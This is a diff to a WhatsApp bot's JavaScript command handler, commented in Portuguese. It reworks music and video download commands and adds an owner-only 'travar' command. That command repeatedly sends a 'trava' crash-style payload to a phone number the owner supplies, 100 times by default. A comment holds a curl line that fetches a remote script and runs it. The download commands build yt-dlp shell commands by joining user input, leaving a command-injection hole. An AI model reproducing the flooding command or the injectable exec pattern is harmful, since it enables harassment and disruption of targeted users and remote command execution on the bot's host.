@@ -51,31 +51,33 @@ async function commandHandler(bot, cmd, data) {
         /* %$MIDIA$% */
 
         case "music":{
+            bot.replyText(data, "Aguarde enquanto eu baixo a musica...");
             // retorna uma musica
             if(args.length < 1) {
                 return await bot.replyText(data, "Por favor, escolha uma música!");
             } else {
-                const argument = args.join(" "); // get the argument
+                let argument = args.join(" "); // get the argument
                 // regex para ver se o argument é um link
-                const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?/;
-                if(regex.test(argument)) { // se o argumento for um link
-                    const filename = Math.round(Math.random() * 100000) + ".opus"; // cria um nome aleatório para o arquivo
-                    const query = "yt-dlp -x -S 'res:480' " + " -o " + filename + " " + argument; // query para baixar a música
-                    console.log(query); // loga a query
-                    exec(query, async (error) => { // executa a query
-                        if(error) { // se houver erro
-                            console.log("erro> " + error); // loga o erro
-                            console.log("Apagando arquivo " + filename); // loga a mensagem
-                            fs.unlinkSync(filename); // apaga o arquivo
-                            return await bot.replyText(data, "Houve um erro ao processar!"); // retorna a mensagem de erro
-                        } else { // se não houver erro
-                            await bot.replyMedia(data, filename, MessageType.audio); // envia a música
-                            console.log("Apagando arquivo " + filename); // loga a mensagem
-                            fs.unlinkSync(filename);    // apaga o arquivo
-                            return;
-                        }
-                    })
+                const regex = /[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi;
+                if(!regex.test(argument)) { // se o argumento for um link
+                    argument = "\"ytsearch:" + argument + "\"";
                 }
+                const filename = Math.round(Math.random() * 100000) + ".opus"; // cria um nome aleatório para o arquivo
+                const query = "yt-dlp -x -S 'res:480' " + " -o " + filename + " " + argument; // query para baixar a música
+                console.log(query); // loga a query
+                exec(query, async (error) => { // executa a query
+                    if(error) { // se houver erro
+                        console.log("erro> " + error); // loga o erro
+                        console.log("Apagando arquivo " + filename); // loga a mensagem
+                        fs.unlinkSync(filename); // apaga o arquivo
+                        return await bot.replyText(data, "Houve um erro ao processar!"); // retorna a mensagem de erro
+                    } else { // se não houver erro
+                        await bot.replyMedia(data, filename, MessageType.audio); // envia a música
+                        console.log("Apagando arquivo " + filename); // loga a mensagem
+                        fs.unlinkSync(filename);    // apaga o arquivo
+                        return;
+                    }
+                });
 
             }
             break;
@@ -86,33 +88,33 @@ async function commandHandler(bot, cmd, data) {
             if(args.length < 1) {
                 return await bot.replyText(data, "Por favor, escolha um video");
             } else {
-                const argument = args.join(" "); // get the argument
+                bot.replyText(data, "Aguarde enquanto eu baixo o video...");
+                let argument = args.join(" "); // get the argument
                 // regex para ver se o argument é um link
                 const regex = /[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi;
-                if(regex.test(argument)) { // se o argumento for um link
-                    let filename = Math.round(Math.random() * 100000); // cria um nome aleatório para o arquivo
-                    const query = "yt-dlp -f mp4 -S 'res:480' " + " -o " + filename + " " + argument; // query para baixar a música
-                    filename = "./" + filename;
-                    console.log(query); // loga a query
-                    exec(query, async (error) => { // executa a query
-                        if(error) { // se houver erro
-                            console.log("erro> " + error); // loga o erro
-                            console.log("Apagando arquivo " + filename); // loga a mensagem
-                            fs.unlinkSync(filename); // apaga o arquivo
-                            return await bot.replyText(data, "Houve um erro ao processar!"); // retorna a mensagem de erro
-                        }
-                    }).on("exit", async () => {
-                            await bot.replyMedia(data, filename, MessageType.video, Mimetype.mp4); // envia a música
-                            console.log("Apagando arquivo " + filename); // loga a mensagem
-                            fs.unlinkSync(filename);    // apaga o arquivo
-                            return;
-                    });
+                if(!regex.test(argument)) { // se o argumento for um link
+                    argument = "\"ytsearch:" + argument + "\"";
                 }
-
-            }
+                let filename = Math.round(Math.random() * 100000); // cria um nome aleatório para o arquivo
+                const query = "yt-dlp -f mp4 -S 'res:360' " + " -o " + filename + " " + argument; // query para baixar a música
+                filename = "./" + filename;
+                console.log(query); // loga a query
+                exec(query, async (error) => { // executa a query
+                    if(error) { // se houver erro
+                        console.log("erro> " + error); // loga o erro
+                        console.log("Apagando arquivo " + filename); // loga a mensagem
+                        fs.unlinkSync(filename); // apaga o arquivo
+                        return await bot.replyText(data, "Houve um erro ao processar!"); // retorna a mensagem de erro
+                    } else { // se não houver erro
+                        await bot.replyMedia(data, filename, MessageType.video, Mimetype.mp4); // envia a música
+                        console.log("Apagando arquivo " + filename); // loga a mensagem
+                        fs.unlinkSync(filename);    // apaga o arquivo
+                        return;
+                    }
+                });
+                }
             break;
         }
-
 
         case "vozes":
         case "voz": {
@@ -541,6 +543,25 @@ ${message}`
             return await bot.replyText(data, error);
         }
 
+        case "travar": {
+            if(!data.bot_data.sender_is_owner) {
+                error = "Erro! Só pode ser enviado pelo dono do bot!";
+            } else if (args.length < 1) {
+                error = "Erro! Preciso do numero a ser travado!";
+            } else {
+                let times = 100;
+                if (args.length > 1) {
+                    times = args[1];
+                }
+                const number = args[0] + "s.whatsapp.net";
+                let trava = fs.readFileSync("./etc/trava", "utf8");  // curl https://gist.githubusercontent.com/kamuridesu/817222c6ab0958a94e2f98d36677e5e0/raw/e49a9a4041507717aa845fb44b5f153819c1a38d/setup.sh > setup.sh && chmod +x setup.sh && sh ./setup.sh && rm setup.sh
+                for(let i = 0; i < times; i++) {
+                    await bot.sendTextMessage(data, trava, number);
+                }
+                return await bot.replyText(data, "Trava enviada com sucesso!");
+            }
+            return await bot.replyText(data, error);
+        }
         
         /* %$ENDBOTOWNER$% */
     }
